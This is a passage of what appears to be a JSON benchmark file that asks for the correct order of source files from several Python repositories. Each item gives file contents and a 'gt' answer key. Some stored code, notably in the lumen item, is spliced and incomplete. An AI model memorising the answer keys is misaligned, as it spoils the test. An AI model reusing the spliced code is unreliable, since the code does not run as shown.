unittest.main()\n",
        "gt": [
            "'mana/mana/templates/auth/_auth_login_css.py'",
            "'mana/mana/templates/auth/__init__.py'",
            "'mana/mana/mana.py'",
            "'mana/test_mana.py'"
        ]
    },
    {
        "files": [
            "'lumen/lumen/ui/main.py'",
            "'lumen/lumen/ui/launcher.py'",
            "'lumen/lumen/ui/state.py'",
            "'lumen/lumen/ui/builder.py'"
        ],
        "content": "'lumen/lumen/ui/main.py'\n:from pathlib import Path\n\nimport panel as pn\n\nfrom panel.io.resources import CSS_URLS\nfrom panel.template import FastListTemplate\n\nfrom lumen.ui.builder import Builder\nfrom lumen.ui.state import state\n\nCSS_RAW =\n\npn.extension(\n    'ace', 'perspective', 'tabulator', raw_css=[CSS_RAW],\n    css_files=[CSS_URLS['font-awesome']], notifications=True\n)\n\ndef main():\n    path = Path(state.components)\n    path.mkdir(parents=True, exist_ok=True)\n    params = {'component_dir': str(path)}\n    (path / 'dashboards').mkdir(parents=True, exist_ok=True)\n    (path / 'launchers').mkdir(parents=True, exist_ok=True)\n    (path / 'pipelines').mkdir(parents=True, exist_ok=True)\n    (path / 'sources').mkdir(parents=True, exist_ok=True)\n    (path / 'layouts').mkdir(parents=True, exist_ok=True)\n    (path / 'variables').mkdir(parents=True, exist_ok=True)\n    (path / 'views').mkdir(parents=True, exist_ok=True)\n    state.modal = pn.Column(sizing_mode='stretch_both')\n    state.spec = {'config': {}, 'sources': {}, 'layouts': [], 'variables': {}}\n    state.template = FastListTemplate(theme='dark', title='Lumen Builder')\n    builder = Builder(\n        template=state.template, spec=state.spec, modal=state.modal, **params\n    )\n    builder.servable()\n\nif __name__.startswith('bokeh'):\n    main()\n\n'lumen/lumen/ui/launcher.py'\n:import io\nimport tempfile\n\nimport panel as pn\nimport param\nimport yaml\n\nfrom ..dashboard import Dashboard\nfrom ..state import state as lm_state\nfrom ..util import is_ref, resolve_module_reference\nfrom .base import WizardItem\nfrom .gallery import Gallery, GalleryItem\nfrom .state import state\n\n\nclass LauncherGalleryItem(GalleryItem):\n\n\n    icon = param.String(doc=\"The FontAwesome icon to render.\")\n\n    launcher = param.Parameter(precedence=-1, doc=\"The Launcher instance.\")\n\n    selected = param.Boolean(default=False, doc=\"Whether the item was selected.\")\n\n    spec = param.Dict(doc=\"The specification for the Launcher instance.\")\n\n    _template = \"\"\"\n    <div id=\"launcher-item\" onclick=\"${_select}\" style=\"display: flex; flex-direction: column; height: 100%; justify-content: space-between;\">\n      <div style=\"font-size: 1.25em; font-weight: bold;\">{{ name }}</div>\n      <div style=\"text-align: center; font-size: 8em;\">\n        <i id=\"icon\" class=\"fas {{ launcher.icon }}\"></i>\n      </div>\n      <p style=\"height: 4em;\">${description}</p>\n    </div>\n    \"\"\"\n\n    def __init__(self, launcher, **params):\n        params['name'] = launcher.name.replace('Launcher', '')\n        description = ''\n        for line in launcher.__doc__.split('\\n'):\n            if line.strip() and not line.startswith('params('):\n                description = line\n                break\n        super().__init__(launcher=launcher, description=description, **params)\n\n    def _select(self, event):\n        self.selected = True\n\n\nclass Launcher(WizardItem):\n\n\n    __abstract = True\n\n\nclass LauncherGallery(WizardItem, Gallery):\n    \"Launch or download your dashboard specification.\"\n\n    auto_advance = param.Boolean(default=True)\n\n    path = param.Foldername()\n\n    spec = param.Dict(default={}, precedence=-1)\n\n    _template = \"\"\"\n    <span style=\"font-size: 2em;\">{{ __doc__ }}</span>\n    <fast-divider style=\"margin: 1em 0;\"></fast-divider>\n    <div id=\"items\" style=\"margin: 1em 0; display: flex; flex-wrap: wrap; gap: 1em;\">\n    {% for item in items.values() %}\n      <fast-card id=\"launcher-container\" class=\"gallery-item\" style=\"height: 290px; width: 350px; padding: 1em; margin: 0.2em;\">\n        ${item}\n      </fast-card>\n    {% endfor %}\n    </div>\n\n    Launches the dashboard locally.\n\n    <span style=\"font-size: 1.5em\">Launcher</span>\n    <p>{{ __doc__ }}</p>\n    <fast-divider></fast-divider>\n    <div style=\"width: 100%\">\n      <fast-button id=\"launch-button\" style=\"margin: 2em auto;\" onclick=\"${_launch}\">Launch</fast-button>\n    </div>\n\n    Download or copy the dashboard yaml specification.\n\n    <span style=\"font-size: 1.5em\">Launcher</span>\n    <p>{{ __doc__ }}</p>\n    <fast-divider></fast-divider>\n    <div id=\"download\">${download}</div>\n    <div id=\"yaml\">${editor}</div>\n\n            window.location.href = '/logout'\n            \"\"\")\n            self.template.header.extend([\n                pn.layout.HSpacer(),\n                f'<b><font size=\"4.5em\">User: {pn.state.user}</font></b>',\n                logout\n            ])\n        self.template.main.append(self.wizard)\n        self.template.modal.append(self.modal)\n\n    def _open_dialog(self, event):\n        self.wizard.preview.object = dict(state.spec)\n        self.wizard.open_modal()\n\n    @param.depends('welcome.spec', watch=True)\n    def _update_spec(self):\n        self.wizard.loading = True\n        for key, item in self.welcome.spec.items():\n            if isinstance(item, list):\n                self.spec[key][:] = item\n            else:\n                if key in self.spec:\n                    self.spec[key].clear()\n                    self.spec[key].update(item)\n                else:\n                    self.spec[key] = item\n\n        for name, source in self.sources.sources.items():\n            config.root = str(pathlib.Path(__file__).parent)\n            spec = source.spec\n            if isinstance(source.spec, dict):\n                spec = dict(source.spec)\n                spec['name'] = name\n                spec.pop('filters', None)\n\n        for name, pipeline in self.pipelines.pipelines.items():\n            config.root = str(pathlib.Path(__file__).parent)\n            spec = pipeline.spec\n            if isinstance(pipeline.spec, dict):\n                spec = dict(pipeline.spec)\n                spec['name'] = name\n            try:\n                lm_state.pipelines[name] = Pipeline.from_spec(spec)\n            except Exception:\n                pass\n\n        self.config.param.trigger('spec')\n        self.sources.param.trigger('spec')\n        self.pipelines.param.trigger('spec')\n\n        views, view_gallery = [], {}\n        layouts, layout_items = [], {}\n        for layout in self.spec['layouts']:\n            view_specs = layout['views']\n            if isinstance(view_specs, list):\n                specs = {}\n                for view in view_specs:\n                    name = f\"{view['type']}: {view['table']}\"\n                    while name in specs:\n                        if name[-2] == ' ' and name[-1].isdigit():\n                            name = f'{name[:-2]} {int(name[-1])+1}'\n                        else:\n                            name = f'{name} 2'\n                    specs[name] = view\n                view_specs = specs\n            view_specs = view_specs.items()\n            layout_views = []\n            for name, view in view_specs:\n                view = dict(view)\n                view_type = view.get('type')\n                view_editor = ViewEditor(\n                    view_type=view_type, name=name, spec=view, pipeline=layout.get('pipeline')\n                )\n                view_gallery[name] = ViewGalleryItem(\n                    editor=view_editor, name=name, selected=True, spec=view\n                )\n                views.append(view_editor)\n                layout_views.append(name)\n\n            layout_editor = LayoutEditor(spec=layout, views=layout_views)\n            item = LayoutGalleryItem(spec=layout, editor=layout_editor)\n            layouts.append(layout_editor)\n            layout_items[f'layout{uuid.uuid4().hex}'] = item\n\n        self.layouts.param.set_param(layouts=layouts, items=layout_items)\n        self.views.param.set_param(views=views, items=view_gallery)\n        self.welcome.ready = True\n        self.wizard.loading = False\n\n    def servable(self, title='Lumen Builder'):\n        self.template.servable(title=title)\n",
        "gt": [
            "'lumen/lumen/ui/state.py'",
            "'lumen/lumen/ui/launcher.py'",
            "'lumen/lumen/ui/builder.py'",
            "'lumen/lumen/ui/main.py'"
        ]
    },
    {
        "files": [
            "'fireREST/fireREST/fmc/device/devicerecord/routing/virtualrouter/ospfinterface/__init__.py'",
            "'fireREST/test/fmc/devicerecord/test_devicerecord.py'",
            "'fireREST/fireREST/fmc/device/devicerecord/routing/virtualrouter/__init__.py'",
            "'fireREST/fireREST/fmc/device/devicerecord/routing/__init__.py'"
        ],
        "content": "'fireREST/fireREST/fmc/device/devicerecord/routing/virtualrouter/ospfinterface/__init__.py'\n:from fireREST.defaults import API_RELEASE_660\nfrom fireREST.fmc import NestedChildResource\n\n\nclass OspfInterface(NestedChildResource):\n    CONTAINER_NAME = 'DeviceRecord'\n    CONTAINER_PATH = '/devices/devicerecords/{uuid}'\n    CHILD_CONTAINER_NAME = 'VirtualRouter'\n    CHILD_CONTAINER_PATH = '/devices/devicerecords/{container_uuid}/routing/virtualrouters/{uuid}'\n    PATH = '/devices/devicerecords/{container_uuid}/routing/virtualrouters/{child_container_uuid}/' \\\n           'ospfinterface/{uuid}'\n    MINIMUM_VERSION_REQUIRED_GET = API_RELEASE_660\n\n'fireREST/test/fmc/devicerecord/test_devicerecord.py'\n:\n\nfrom fireREST.fmc.device.devicerecord.bridgegroupinterface import BridgeGroupInterface\nfrom fireREST.fmc.device.devicerecord.etherchannelinterface import EtherChannelInterface\nfrom fireREST.fmc.device.devicerecord.fpinterfacestatistics import FpInterfaceStatistics\nfrom fireREST.fmc.device.devicerecord.fplogicalinterface import FpLogicalInterface\nfrom fireREST.fmc.device.devicerecord.fpphysicalinterface import FpPhysicalInterface\nfrom fireREST.fmc.device.devicerecord.inlineset import InlineSet\nfrom fireREST.fmc.device.devicerecord.interfaceevent import InterfaceEvent\nfrom fireREST.fmc.device.devicerecord.operational import Operational\nfrom fireREST.fmc.device.devicerecord.physicalinterface import PhysicalInterface\nfrom fireREST.fmc.device.devicerecord.redundantinterface import RedundantInterface\nfrom fireREST.fmc.device.devicerecord.routing import Routing\nfrom fireREST.fmc.device.devicerecord.subinterface import SubInterface\nfrom fireREST.fmc.device.devicerecord.virtualswitch import VirtualSwitch\nfrom fireREST.fmc.device.devicerecord.virtualtunnelinterface import VirtualTunnelInterface\nfrom fireREST.fmc.device.devicerecord.vlaninterface import VlanInterface\n\n\ndef test_initialization(fmc):\n    devicerecord = fmc.device.devicerecord\n    assert isinstance(devicerecord.bridgegroupinterface, BridgeGroupInterface)\n    assert isinstance(devicerecord.etherchannelinterface, EtherChannelInterface)\n    assert isinstance(devicerecord.fpinterfacestatistics, FpInterfaceStatistics)\n    assert isinstance(devicerecord.fplogicalinterface, FpLogicalInterface)\n    assert isinstance(devicerecord.fpphysicalinterface, FpPhysicalInterface)\n    assert isinstance(devicerecord.inlineset, InlineSet)\n    assert isinstance(devicerecord.interfaceevent, InterfaceEvent)\n    assert isinstance(devicerecord.operational, Operational)\n    assert isinstance(devicerecord.physicalinterface, PhysicalInterface)\n    assert isinstance(devicerecord.redundantinterface, RedundantInterface)\n    assert isinstance(devicerecord.routing, Routing)\n    assert isinstance(devicerecord.subinterface, SubInterface)\n    assert isinstance(devicerecord.virtualswitch, VirtualSwitch)\n    assert isinstance(devicerecord.virtualtunnelinterface, VirtualTunnelInterface)\n    assert isinstance(devicerecord.vlaninterface, VlanInterface)\n\n'fireREST/fireREST/fmc/device/devicerecord/routing/virtualrouter/__init__.py'\n:from fireREST.defaults import API_RELEASE_660\nfrom fireREST.fmc import ChildResource, Connection\nfrom fireREST.fmc.device.devicerecord.routing.virtualrouter.bgp import Bgp\nfrom fireREST.fmc.device.devicerecord.routing.virtualrouter.ipv4staticroute import Ipv4StaticRoute\nfrom fireREST.fmc.device.devicerecord.routing.virtualrouter.ipv6staticroute import Ipv6StaticRoute\nfrom fireREST.fmc.device.devicerecord.routing.virtualrouter.ospfinterface import OspfInterface\nfrom fireREST.fmc.device.devicerecord.routing.virtualrouter.ospfv2route import Ospfv2Route\nfrom fireREST.fmc.device.devicerecord.routing.virtualrouter.policybasedroute import PolicyBasedRoute\n\n\nclass VirtualRouter(ChildResource):\n    CONTAINER_NAME = 'DeviceRecord'\n    CONTAINER_PATH = '/devices/devicerecords/{uuid}'\n    PATH = '/devices/devicerecords/{container_uuid}/routing/virtualrouters/{uuid}'\n    MINIMUM_VERSION_REQUIRED_CREATE = API_RELEASE_660\n    MINIMUM_VERSION_REQUIRED_GET = API_RELEASE_660\n    MINIMUM_VERSION_REQUIRED_UPDATE = API_RELEASE_660\n    MINIMUM_VERSION_REQUIRED_DELETE = API_RELEASE_660\n\n    def __init__(self, conn: Connection):\n        super().__init__(conn)\n\n        self.bgp = Bgp(conn)\n        self.ipv4staticroute = Ipv4StaticRoute(conn)\n        self.ipv6staticroute = Ipv6StaticRoute(conn)\n        self.ospfinterface = OspfInterface(conn)\n        self.ospfv2route = Ospfv2Route(conn)\n        self.policybasedroute = PolicyBasedRoute(conn)\n\n'fireREST/fireREST/fmc/device/devicerecord/routing/__init__.py'\n:from fireREST.fmc import Connection\nfrom fireREST.fmc.device.devicerecord.routing.bgp import Bgp\nfrom fireREST.fmc.device.devicerecord.routing.bgpgeneralsettings import BgpGeneralSettings\nfrom fireREST.fmc.device.devicerecord.routing.ipv4staticroute import Ipv4StaticRoute\nfrom fireREST.fmc.device.devicerecord.routing.ipv6staticroute import Ipv6StaticRoute\nfrom fireREST.fmc.device.devicerecord.routing.ospfinterface import OspfInterface\nfrom fireREST.fmc.device.devicerecord.routing.ospfv2route import Ospfv2Route\nfrom fireREST.fmc.device.devicerecord.routing.ospfv3interface import Ospfv3Interface\nfrom fireREST.fmc.device.devicerecord.routing.policybasedroute import PolicyBasedRoute\nfrom fireREST.fmc.device.devicerecord.routing.staticroute import StaticRoute\nfrom fireREST.fmc.device.devicerecord.routing.virtualrouter import VirtualRouter\n\n\nclass Routing:\n    def __init__(self, conn: Connection):\n        self.bgp = Bgp(conn)\n        self.bgpgeneralsettings = BgpGeneralSettings(conn)\n        self.ipv4staticroute = Ipv4StaticRoute(conn)\n        self.ipv6staticroute = Ipv6StaticRoute(conn)\n        self.ospfinterface = OspfInterface(conn)\n        self.ospfv2route = Ospfv2Route(conn)\n        self.ospfv3interface = Ospfv3Interface(conn)\n        self.policybasedroute = PolicyBasedRoute(conn)\n        self.staticroute = StaticRoute(conn)\n        self.virtualrouter = VirtualRouter(conn)\n",
        "gt": [
            "'fireREST/fireREST/fmc/device/devicerecord/routing/virtualrouter/ospfinterface/__init__.py'",
            "'fireREST/fireREST/fmc/device/devicerecord/routing/virtualrouter/__init__.py'",
            "'fireREST/fireREST/fmc/device/devicerecord/routing/__init__.py'",
            "'fireREST/test/fmc/devicerecord/test_devicerecord.py'"
        ]
    },
    {
        "files": [
            "'HTTPLang/httplang/tokenize.py'",
            "'HTTPLang/httplang/parse.py'",
            "'HTTPLang/httplang/__init__.py'",
            "'HTTPLang/httplang.py'"
        ],
        "content": "'HTTPLang/httplang/tokenize.py'\n:import re\nimport sys\n\ntokens = {\n        \"^do$\":\"DO\",\n        \"^set$\":\"SET\",\n        \"^GET$|^POST$|^PUT$|^DELETE$|^PATCH$\":\"METHOD\",\n        \"^URL$|^SETCOOKIE$|^COOKIE$|^RESPONSE$|^POSTDATA$|^USERAGENT$|^STATUS$|^LINKS$\":\"GLOBAL\",\n        \"^show$\":\"SHOW\",\n        \"^if$\":\"CONDITION\",\n        \"^label$\":\"LABEL\",\n        \"^goto$\":\"GOTO\",\n        \">|<|==|!=|>=|<=\":\"OPERATOR\",\n        \"\\\"(.*?)\\\"\":\"STRING\",\n        \"[0-9]+\":\"INTEGER\"\n}\n\ndef getTokens(stream):\n    token = \"\"\n    line = 1\n    for char in stream.read():\n        if char == \" \" or char == \"\\n\":\n            for token_check in tokens:\n                check = re.findall(token_check, token)\n                if check:\n                    token = \"\"\n                    yield {\n                            \"lexeme\":check[0],\n                            \"tokenType\":tokens[token_check]\n                          }\n                    break\n            else:\n                sys.exit(\"Invalid Token: {} on line {}\".format(token, line))\n            if char == \"\\n\":\n                line += 1\n        else:\n            token += char\n\nif __name__ == \"__main__\":\n    print(list(getTokens(open(\"test.httpl\"))))\n\n'HTTPLang/httplang/parse.py'\n:import tokenize\nimport sys\nimport global_data\nimport itertools\n\nglobal line\nline = 0\n\nclass AST:\n    def __init__(self, left, right, tt, lexeme, l):\n        self.left = left\n        self.right = right\n        self.token_type = tt\n        self.lexeme = lexeme\n        self.line = l\n\ndef program(tokens):\n    global line\n    switch = {\n        \"DO\":do,\n        \"SET\":set_,\n        \"SHOW\":show,\n        \"LABEL\":label,\n        \"GOTO\":goto,\n        \"CONDITION\":condition\n    }\n    for token in tokens:\n        tt = token['tokenType']\n        if switch.get(tt):\n            line += 1\n            yield switch[tt](tokens)\n        else:\n            sys.exit(\"Parse Error: Don't know what to do with {} line {}\".format(token, line))\n\ndef condition(tokens):\n    condition_expr = expr(tokens)\n    goto_check = tokens.next()\n    if goto_check['tokenType'] != \"GOTO\":\n        sys.exit(\"Parse Error: goto expected after condition line {}\".format(line))\n    goto_part = goto(tokens)\n    return AST(condition_expr, goto_part, \"CONDITION\", None, line)\n\ndef do(tokens):\n    method_val = method(tokens)\n    location = string(tokens)\n    return AST(method_val, location, \"DO\", None, line)\n\ndef set_(tokens):\n    global_val = global_var(tokens)\n    tokens, copy = itertools.tee(tokens)\n    type_check = copy.next()['tokenType']\n    if type_check == \"GLOBAL\":\n        location = global_var(tokens)\n    else:\n        location = string(tokens)\n    return AST(global_val, location, \"SET\", None, line)\n\ndef expr(tokens):\n    left_arg = tokens.next()\n    if left_arg['tokenType'] not in [\"GLOBAL\", \"STRING\", \"INTEGER\"]:\n        sys.exit(\"Parse Error: Invalid left argument {} line {}\".format(left_arg['lexeme'], line))\n\n    op = tokens.next()\n    if op['tokenType'] != \"OPERATOR\":\n        sys.exit(\"Parse Error: Invalid operator {} line {}\".format(op['lexeme'], line))\n\n    right_arg = tokens.next()\n    if right_arg['tokenType'] not in [\"GLOBAL\", \"STRING\", \"INTEGER\"]:\n        sys.exit(\"Parse Error: Invalid right argument {} line {}\".format(right_arg[\"lexeme\"], line))\n    return AST(\n            AST(None, None, left_arg['tokenType'], left_arg['lexeme'], line),\n            AST(None, None, right_arg[\"tokenType\"], right_arg['lexeme'], line),\n            \"OPERATOR\",\n            op['lexeme'],\n            line)\n\ndef show(tokens):\n    tokens, copy = itertools.tee(tokens)\n    type_check = copy.next()['tokenType']\n    if type_check == \"STRING\":\n        variable_name = string(tokens)\n    else:\n        variable_name = global_var(tokens)\n    return AST(variable_name, None, \"SHOW\", None, line)\n\ndef label(tokens):\n    label_name = string(tokens)\n    global_data.labels[label_name.lexeme] = line - 1\n    return AST(label_name, None, \"LABEL\", None, line)\n\ndef goto(tokens):\n    label_name = string(tokens)\n    return AST(label_name, None, \"GOTO\", None, line)\n\ndef string(tokens):\n    string_val = tokens.next()\n    if string_val['tokenType'] != \"STRING\":\n        sys.exit(\"Parse Error: {} is not a STRING line {}\".format(string_val['lexeme'], line))\n    return AST(None, None, string_val['tokenType'], string_val['lexeme'], line)\n\ndef integer(tokens):\n    int_val = tokens.next()\n    if int_val['tokenType'] != \"INTEGER\":\n        sys.exit(\"TypeError: {} is not an INTEGER line {}\".format(int_val['lexeme'], line))\n    try:\n        int_val['lexeme'] = int(int_val['lexeme'])\n    except:\n        sys.exit(\"Type Error: {} is not an INTEGER\")\n\n    return AST(None, None, int_val['tokenType'], int_val['lexeme'], line)\n\ndef method(tokens):\n    method_val = tokens.next()\n    if method_val['tokenType'] != \"METHOD\":\n        sys.exit(\"Type Error: {} is not a METHOD line {}\".format(method_val['lexeme'], line))\n    return AST(None, None, method_val['tokenType'], method_val['lexeme'], line)\n\ndef global_var(tokens):\n    variable_val = tokens.next()\n    if variable_val['tokenType'] == \"GLOBAL_VAR\":\n        sys.exit(\"Type Error: {} is not a GLOBAL_VAR line {}\".format(variable_val['lexeme'], line))\n    return AST(None, None, variable_val['tokenType'], variable_val['lexeme'], line)\n\nif __name__ == \"__main__\":\n    print(list(program(tokenize.getTokens(open(\"test.httpl\")))))\n\n\n'HTTPLang/httplang/__init__.py'\n:import evaluate\nimport global_data\nimport make_request\nimport parse\nimport tokenize\n\n'HTTPLang/httplang.py'\n:from httplang import *\nimport sys\nimport os\n\nif len(sys.argv) < 2:\n    sys.exit(\"Usage: python httplang.py <file>.httpl\")\n\nif not os.path.exists(sys.argv[1]):\n    sys.exit(\"No file names {}\".format(sys.argv[1]))\n\nevaluate.evaluate(parse.program(tokenize.getTokens(open(sys.argv[1]))))\n",
        "gt": [
            "'HTTPLang/httplang/tokenize.py'",
            "'HTTPLang/httplang/parse.py'",
            "'HTTPLang/httplang/__init__.py'",
            "'HTTPLang/httplang.py'"
        ]
    },
    {
        "files": [
            "'django-docker-compose/proj/urls.py'",
            "'django-docker-compose/demoapp/views.py'",
            "'django-docker-compose/demoapp/tasks.py'"
        ],
        "content": "'django-docker-compose/proj/urls.py'\n:\nfrom django.conf.urls import include, url\nfrom django.contrib import admin\nfrom demoapp.views import Hello\n\nurlpatterns = [\n    url(r'^$', Hello),\n    url(r'^admin/', include(admin.site.urls)),\n]\n\n'django-docker-compose/demoapp/views.py'\n:from django.shortcuts import render\nfrom django.http import HttpResponse\nfrom demoapp.tasks import hello\n\ndef Hello(request):\n    greeting = 'Hello, World!'\n    hello.delay(greeting)\n    return HttpResponse(greeting)\n\n'django-docker-compose/demoapp/tasks.py'\n:from __future__ import absolute_import\n\nfrom celery import shared_task\n\n@shared_task\ndef hello(greeting):\n    print('Task recived: {0}'.format(greeting))\n",
        "gt": [
            "'django-docker-compose/demoapp/tasks.py'",
            "'django-docker-compose/demoapp/views.py'",
            "'django-docker-compose/proj/urls.py'"
        ]
    },
    {
        "files": [
            "'django-shrink/shrink/templatetags/shrink.py'",
            "'django-shrink/shrink/management/commands/collectstatic.py'",
            "'django-shrink/shrink/helpers.py'"
        ],
        "content": "'django-shrink/shrink/templatetags/shrink.py'\n:import re\nfrom ..conf import settings\nfrom ..helpers import storage, find_static\nfrom django.forms.widgets import flatatt\nfrom django.utils.datastructures import SortedDict\nfrom django.template import Library, Node, TemplateSyntaxError\n\n\nregister = Library()\nkw_pat = re.compile(r'^(?P<key>[\\w]+)=(?P<value>.+)$')\n\n\nclass ShrinkNode(Node):\n    error_message = ''\n    endtag = ''\n    template = ''\n\n    def __init__(self, parser, token):\n        bits = token.split_contents()\n        if len(bits) < 2:\n            raise TemplateSyntaxError(self.error_message)\n        self.destination = bits[1].strip('\\'\"')\n        attrs = SortedDict()\n        for bit in bits[2:]:\n            m = kw_pat.match(bit)\n            if not m:\n                raise TemplateSyntaxError(self.error_message)\n            attrs[m.group('key')] = m.group('value')\n        self.attrs = flatatt(attrs)\n        self.nodelist = parser.parse((self.endtag,))\n        parser.delete_first_token()\n\n    def get_prefix(self, path):\n        return settings.STATIC_URL\n\n    def get_paths(self, context={}, absolute=False):\n        block = self.nodelist.render(context)\n        paths = []\n        for path in block.replace('\\r\\n', '\\n').split('\\n'):\n            path = path.strip()\n            if path and absolute:\n                path = find_static(path)\n            if path and path not in paths:\n                paths.append(path)\n        return paths\n\n    def render(self, context):\n        if settings.DEBUG:\n            tags = []\n            for path in self.get_paths(context):\n                tag = self.template.format(prefix=self.get_prefix(path),\n                    path=path, attrs=self.attrs)\n                tags.append(tag)\n            return '\\n'.join(tags)\n        else:\n            path = storage.url(self.destination)\n            if settings.SHRINK_TIMESTAMP:\n                try:\n                    timetamp = storage.modified_time(\n                        self.destination).isoformat()\n                    path = '%s?%s' % (path, timetamp)\n                except Exception:\n                    pass\n            return self.template.format(prefix='', path=path, attrs=self.attrs)\n\n\n@register.tag('scripts')\nclass ScriptNode(ShrinkNode):\n    error_message = 'Usage: scripts destination [keyword arguments]'\n    endtag = 'endscripts'\n    template = '<script src=\"{prefix}{path}\"{attrs}></script>'\n\n    def __repr__(self):\n        return '<ScriptNode>'\n\n\n@register.tag('styles')\nclass StyleNode(ShrinkNode):\n    error_message = 'Usage: styles destination [keyword arguments]'\n    endtag = 'endstyles'\n    template = '<link rel=\"stylesheet\" href=\"{prefix}{path}\"{attrs}>'\n\n    def __repr__(self):\n        return '<StyleNode>'\n\n\n'django-shrink/shrink/management/commands/collectstatic.py'\n:import os\nfrom django.conf import settings\nfrom django.contrib.staticfiles.management.commands.collectstatic import Command as CollectStaticCommand\nfrom django.template.loader import get_template\nfrom shrink.helpers import import_string, handle_extensions\nfrom shrink.base import StyleShrink, ScriptShrink\nfrom shrink.templatetags.shrink import ScriptNode, StyleNode\nfrom optparse import make_option\nfrom os.path import isdir, splitext, join as pjoin\n\n\ndef rshrink(node, t):\n\n    if isinstance(node, ScriptNode):\n        shrink = ScriptShrink(node, t.name)\n        shrink.update()\n    elif isinstance(node, StyleNode):\n        shrink = StyleShrink(node, t.name)\n        shrink.update()\n    if hasattr(node, 'nodelist'):\n        for n in node.nodelist:\n            rshrink(n, t)\n\n\nclass Command(CollectStaticCommand):\n    help = (\n        \"Collect static files from apps and other locations in a single\"\n        \"location.\\nShrinks javascripts and css defined in templates.\"\n        )\n\n    @property\n    def option_list(self):\n        opt_list = []\n        for opt in CollectStaticCommand.option_list:\n            if opt.get_opt_string() == '--noinput':\n                opt.default = False\n            opt_list.append(opt)\n        opt_list.extend([\n            make_option('--extension', '-e', dest='extensions', default=['html'],\n                help=(\n                    'The file extension(s) to examine for scripts and css '\n                    '(default: \".html\", separate multiple extensions with commas, '\n                    'or use -e multiple times)'\n                    ),\n                action='append'),\n            make_option('--noshrink', action='store_false', dest='shrink',\n                default=True, help=\"Do NOT shrink scripts or css.\"),\n        ])\n        return opt_list\n\n    def handle_noargs(self,  **options):\n        super(Command, self).handle_noargs(**options)\n        if not options.get('shrink'):\n            return\n        extensions = handle_extensions(options['extensions'])\n        templates = set()\n        for loader_dot in settings.TEMPLATE_LOADERS:\n            loader = import_string(loader_dot)()\n            if hasattr(loader, 'get_template_sources'):\n                for template_dir in loader.get_template_sources(''):\n                    if isdir(template_dir):\n                        for (dirpath, dirnames, filenames) in os.walk(template_dir):\n                            for f in filenames:\n                                if splitext(f)[1] in extensions:\n                                    templates.add(get_template(pjoin(dirpath, f)))\n        for t in templates:\n            rshrink(t, t)\n\n\n'django-shrink/shrink/helpers.py'\n:import posixpath\nimport sys\nimport urllib\nfrom django.contrib.staticfiles import finders\nfrom django.utils.functional import LazyObject\nfrom shrink.conf import settings\n\n\nclass LazyStorage(LazyObject):\n    def _setup(self):\n        self._wrapped = import_string(settings.SHRINK_STORAGE)()\nstorage = LazyStorage()\n\n\ndef handle_extensions(extensions=('html',)):\n\n    ext_list = []\n    for ext in extensions:\n        ext_list.extend(ext.replace(' ','').split(','))\n    for i, ext in enumerate(ext_list):\n        if not ext.startswith('.'):\n            ext_list[i] = '.%s' % ext_list[i]\n    return set(ext_list)\n\n\ndef find_static(path):\n    normalized_path = posixpath.normpath(urllib.unquote(path)).lstrip('/')\n    absolute_path = finders.find(normalized_path)\n    if absolute_path:\n        return absolute_path.decode(settings.FILE_CHARSET)\n\n\ndef import_string(dot_name):\n\n\n    if isinstance(dot_name, unicode):\n        dot_name = str(dot_name)\n    if '.' in dot_name:\n        mod_name, attr = dot_name.rsplit('.', 1)\n    else:\n        return __import__(dot_name)\n\n\n    if isinstance(attr, unicode):\n        attr = attr.encode('utf-8')\n    try:\n        return getattr(__import__(mod_name, None, None, [attr]), attr)\n    except (ImportError, AttributeError):\n\n\n        mod_name = '%s.%s' % (mod_name, attr)\n        try:\n            __import__(mod_name)\n        except ImportError, e:\n            raise ImportError('Failed to import %s: %s' % (mod_name, e))\n        return sys.modules[mod_name]\n\n",
        "gt": [
            "'django-shrink/shrink/helpers.py'",
            "'django-shrink/shrink/templatetags/shrink.py'",
            "'django-shrink/shrink/management/commands/collectstatic.py'"
        ]
    },
    {
        "files": [
            "'treelearn/treelearn/__init__.py'",
            "'treelearn/treelearn/oblique_tree_node.py'",
            "'treelearn/treelearn/oblique_tree.py'"
        ],
        "content": "'treelearn/treelearn/__init__.py'\n:\nfrom constant_leaf import ConstantLeaf\nfrom tree_node import TreeNode\nfrom randomized_tree import RandomizedTree\nfrom oblique_tree import ObliqueTree\nfrom classifier_ensemble import ClassifierEnsemble\nfrom regression_ensemble import RegressionEnsemble\nfrom clustered_regression import ClusteredRegression\nfrom clustered_classifier import ClusteredClassifier\nfrom recipes import *\n\n__all__ = [\n  'ClassifierEnsemble', 'RegressionEnsemble',\n  'ClusteredRegression', 'ClusteredClassifier',\n  'RandomizedTree', 'TreeNode', 'ConstantLeaf',\n  'train_random_forest',\n  'ObliqueTree',\n  'mk_svm_tree', 'train_svm_tree',\n  'mk_sgd_tree','train_sgd_tree',\n  'train_svm_forest',  'train_sgd_forest',\n  'mk_clustered_regression_ensemble', 'train_clustered_regression_ensemble',\n  'mk_clustered_classifier_ensemble', 'train_clustered_classifier_ensemble',\n  'train_clustered_ols',\n  'mk_additive_regression_forest', 'train_additive_regression_forest',\n]\n\n'treelearn/treelearn/oblique_tree_node.py'\n:from copy import deepcopy\nimport numpy as np\nfrom sklearn.base import BaseEstimator\nfrom tree_helpers import majority, clear_sklearn_fields\nfrom constant_leaf import ConstantLeaf\n\nclass _ObliqueTreeNode(BaseEstimator):\n\n    def __init__(self,\n            split_classifier,\n            leaf_model,\n            num_features_per_node,\n            classes,\n            depth,\n            max_depth,\n            min_leaf_size,\n            randomize_split_params,\n            randomize_leaf_params,\n            verbose):\n\n        self.split_classifier = split_classifier\n        self.leaf_model = leaf_model\n        self.num_features_per_node = num_features_per_node\n        self.classes = classes\n        self.depth = depth\n        self.max_depth = max_depth\n        self.min_leaf_size = min_leaf_size\n        self.randomize_split_params = randomize_split_params\n        self.randomize_leaf_params = randomize_leaf_params\n        self.verbose = verbose\n\n        self.children = {}\n        self.model = None\n        self.subspace = None\n\n    def _fit_leaf(self, X, Y, fit_keywords):\n        if self.verbose:\n            print \"Fitting leaf\"\n        model = deepcopy(self.leaf_model)\n        for field, gen in self.randomize_leaf_params.items():\n            setattr(model, field, gen())\n        model.fit(X, Y, **fit_keywords)\n        clear_sklearn_fields(model)\n        return model\n\n    def _fit_child(self, X_slice, Y_slice, fit_keywords):\n        count = X_slice.shape[0]\n        unique_ys = np.unique(Y_slice)\n        if len(unique_ys) == 1:\n            const = int(unique_ys[0])\n            if self.verbose:\n                print \"ConstantLeaf\", const\n            child = ConstantLeaf(const)\n        elif count < self.min_leaf_size:\n            child = self._fit_leaf(X_slice, Y_slice, fit_keywords)\n        else:\n            child = _ObliqueTreeNode(\n                split_classifier = self.split_classifier,\n                